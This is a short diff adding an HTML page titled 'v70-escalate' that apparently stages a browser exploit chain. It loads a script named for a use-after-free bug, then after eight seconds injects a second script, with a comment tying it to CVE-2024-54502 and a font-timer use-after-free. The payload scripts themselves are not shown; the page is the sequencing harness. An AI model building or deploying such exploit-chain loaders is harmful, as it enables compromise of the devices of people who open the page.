@@ -1,0 +1,13 @@
+<!doctype html><html><head><meta charset="utf-8"><title>v70-escalate</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+</head><body>
+<script src="p250-rab-set-uaf.js?v=250a"></script>
+<script>
+// p229: CVE-2024-54502 font timer UAF after p250 completes (8s)
+setTimeout(function() {
+  var s = document.createElement('script');
+  s.src = 'p229-fontloader-reentrant-v2.js?v=229a';
+  document.body.appendChild(s);
+}, 8000);
+</script>
+</body></html>
